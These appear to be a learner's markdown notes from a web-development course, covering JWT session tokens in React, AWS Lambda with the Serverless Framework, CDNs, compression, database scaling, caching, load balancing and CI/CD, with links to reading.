- Cookies vs Tokens: The Definitive Guide https://dzone.com/articles/cookies-vs-tokens-the-definitive-guide

- Token Authentication vs Cookies https://stackoverflow.com/questions/17000835/token-authentication-vs-cookies

- Why JWTs Suck as Session Tokens https://scotch.io/bar-talk/why-jwts-suck-as-session-tokens

- JWT Debugger https://jwt.io/

### Profile Icon Resources
- reactstrap https://reactstrap.github.io/
- Tachyons https://tachyons.io/

### setState() Callback Resources
- When to Use Callback Function of setState in React https://medium.com/better-programming/when-to-use-callback-function-of-setstate-in-react-37fff67e5a6c?
- When to use React setState callback https://stackoverflow.com/questions/42038590/when-to-use-react-setstate-callback

### HTML Entities
- https://www.w3schools.com/charsets/ref_html_entities_4.asp

### Updating Profile

### Storing JWT Tokens

### Retrieving Auth Token

### Client Session Management
- research Bearer token
```JavaScript
componentDidMount() {
  const token = window.sessionStorage.getItem('token');
  if (token) {
    fetch('http://localhost:3000/signin', {
      method: 'post',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': Bearer token
      }
    })
      .then(data => {
        if (data && data.id) {
          console.log('success we need to get user profile')
        }
      })
      .catch(console.log)
  }
}
```
#### Bearer Token Resources
- Refresh Tokens: When to Use Them and How They Interact with JWTs https://auth0.com/blog/refresh-tokens-what-are-they-and-when-to-use-them/
- Why is 'Bearer' required before the token in 'Authorization' header in HTTP request? https://security.stackexchange.com/questions/108662/why-is-bearer-required-before-the-token-in-authorization-header-in-a-http-re

### Authorization Middleware

### Improving SmartBrain
Task 1: Add pet  and age  column to the database and allow users to update these fields on their profile.

Task 2: Implement token flow as we have done so far for /register  end point as well.

Task 3: Add Sign out functionality where you revoke the token when a user signs out of the app

Task 4 (Bonus): You may notice a lot of repeated code (especially when it comes to fetch()). How can you improve this? Try to refactor the code and perhaps also improve the logic to make the app even better!

You can find the github repositories of the code we have worked on up to this point below:
Front End
Back End
Back End - Dockerized

Enjoy the exercise... it's a tough one!

## Section 14: AWS
- using infrastructure as a service or platform as a service: IaaS, PaaS
- AWS, Microsoft Azure, Google Cloud Platform (GCP), IBM

### Amazon Web Services (DevOps)
1. EC2 (Elastic Compute Cloud): a general purpose bare metal server;  a web service that provides secure, resizable compute capacity in the cloud.

2. S3 (Simple Storage Service): an object storage service where each object is stored as a file with its metadata and ID.

3. Lambda: AWS Lambda lets you run code without provisioning or managing servers. Just provide a function and tell Lambda when to run it. Zero administration, zero configuration.

4. Amazon CloudFront is a fast content delivery network (CDN) service

5. DynamoDB: NoSQL database; Amazon DynamoDB is a key-value and document database that delivers single-digit millisecond performance at any scale.

AWS Flowchart (search AWS Flowcharts for more examples)
![aws-flowchart](/images/aws-flowchart.png)

### Monolithic vs Microservices Architecture
- While a monolithic application is a single unified unit, a microservices architecture breaks it down into a collection of smaller independent units. These units carry out every application process as a separate service. So all the services have their own logic and the database as well as perform the specific functions.

### Amazon Lambda
- serverless applications: hand code over to the cloud provider
- underneath the hood the cloud provider creates a container (docker) and runs the function inside of it.
- cold start problem (downside because the function has to be grabbed from the database and this takes time)
- stateless

### Amazon Lambda Dashboard
- created account
- Serverless Framework https://serverless.com/framework/docs/providers/aws/guide/intro/
- `serverless` installed `sls`
-`sls create -t aws-nodejs`
- serverless works with AWS as well as other providers like Azure and openwhisk (IBM)
- `sls config credentials --provider aws --key 1234 --secret abc`
`nano credentials`
- `sls deploy`
`sls invoke --function rank`
- `sls invoke local --function rank`: not sent to AWS Lambda server

- AWS Lambda `async`
```JavaScript
'use strict';
module.exports.hello = async (event, context) => {  
    return {    
        statusCode: 200,    
        body: JSON.stringify({      
            message: 'Go Serverless v1.0! Your function executed successfully!',      
            input: event,    
        }),  
    };    
// Use this code if you don't use the http event with the LAMBDA-PROXY integration  
// return { message: 'Go Serverless v1.0! Your function executed successfully!', event };
};
```

### IAM Resources
- Managing IAM Policies https://docs.aws.amazon.com/IAM/latest/UserGuide/access_policies_manage.html
- IAM https://serverless.com/framework/docs/providers/aws/guide/iam/

### Deploying a Function

## Section 15: Performance Part 3

### CDNs
- e.g., cloudflare https://www.cloudflare.com/, Amazon CloudFront, MS Azure
- caching
- DDOS (Distributed Denial of Service) Attacks
- fixing latency problem

![cdn](/images/cdn.png)

### GZIP
`content-encoding: gzip`
`const compression = require('compression')`
`app.use(compression())`

### Brotli (from Google) https://brotli.org/
- Brotli is a generic-purpose lossless compression algorithm that compresses data using a combination of a modern variant of the LZ77 algorithm, Huffman coding and 2nd order context modeling, with a compression ratio comparable to the best currently available general-purpose compression methods. It is similar in speed with deflate but offers more dense compression.

### Database Scaling
1. Identify inefficient queries
2. Increase memory
3. Vertical scaling (Redis, Memcached)
4. Sharding
5. More databases
6. Database type

#### Identify Inefficient Queries
- only request what you absolutely need from server
- indexing (so can run binary search) but require additional space
- e.g. `CREATE INDEX idx_name ON table_name (column_name);`
- storage is the slowest piece in a relational database

#### Increase Memory
- give additional memory by improving the hardware that the database is working on

#### Vertical Scaling (Redis, Memcached)
- adding another service so your system uses resources more effectively.
- caching info on Redis to for memory access rather than disk access.

#### Sharding
- breaking the database down into different pieces
- e.g., by age of users: over/under 30 years old

#### More Databases  
- share requests between databases
- distribute the load

#### Database Type
- choose the best database for your project

![dbtypes](/images/dbtypes.png)

### Caching
- temporary storage of data for faster access
- CPU -> RAM -> HDD

![caching](/images/caching.png)

- cache busting

![request](/images/request.png)

### Caching Resources
1. Caching Everywhere https://www.freecodecamp.org/news/the-hidden-components-of-web-caching-970854fe2c49/
2. Cache Headers https://developers.google.com/web/fundamentals/performance/optimizing-content-efficiency/http-caching
3. Catching Performance https://devcenter.heroku.com/articles/increasing-application-performance-with-http-cache-headers

### Load Balancing
- Apache
- NGINX

![load-balancer](/images/load-balancer.png)

![load-balancer2](/images/load-balancer2.png)

### NGINX https://www.nginx.com/
- nginx documentation https://nginx.org/en/docs/
- linode "How to Configure NGINX" https://www.linode.com/docs/web-servers/nginx/how-to-configure-nginx/

#### loadtest
- loadtest https://www.npmjs.com/package/loadtest
- e.g., `loadtest -t 5 -c 100 --rps http://localhost:80`

### Performance Summary Diagrams
- Application Aspects Overview
![aspects](/images/aspects.png)

- Architecture of an App
![architecture](/images/architecture.png)

- Scaling an App
![scaling](/images/scaling.png)

## Section 16: CI/CD (Continuous Integration/Continuous Delivery)
- CI/CD = CD (aka continuous deployment)

- CI/CD -> CD Diagram
 ![CI/CD](/images/CI-CD-CD.png)

 ### Building Great Software
![devprocess](/images/devprocess.png)

### CI Tools
- Top 8 Contnuous Integration Tools https://code-maze.com/top-8-continuous-integration-tools/
- TravisCI or CircleCI for hosted CI servers
- Jenkins for your own managed CI servers

### CircleCI
- https://circleci.com/?utm_source=gb&utm_medium=SEM&utm_campaign=SEM-gb-200-Eng-ni&utm_content=SEM-gb-200-Eng-ni-CircleCI&gclid=Cj0KCQiA9dDwBRC9ARIsABbedBNq1OPViLiVWu5Bh9YonmmuP_nOX2xnAv_1Wxl0zXWA3IFk-lyXcmEaAn4ZEALw_wcB

### Continuous Integration
- Prettier https://prettier.io/

- Code in Production
![code](/images/code-in-production.png)

## Section 17: Extra Bits

### Complexity vs Simplicity
- always choose simplicity over complexity
- good code is self-documenting
- good code minimizes bugs and allows people to add to it without bugs because it's clear and concise

### NPM Is Not Your Friend
- Why do I need this library?
- Assess each new thing before adding it to your project

### Learn to Learn
- find your most efficient way to learn
- keep practicing

### Start with Why
- frameworks, libraries, tools, etc. change constantly
- Fundamental computer science topics and software development practices endure
- Understand why the solution was created, what problem it solves, and why is it the answer to your problem.
- Be the observer with an eagle's eye view and not the hamster trying to keep up with the latest thing.

2020107 Finished course. Yay!
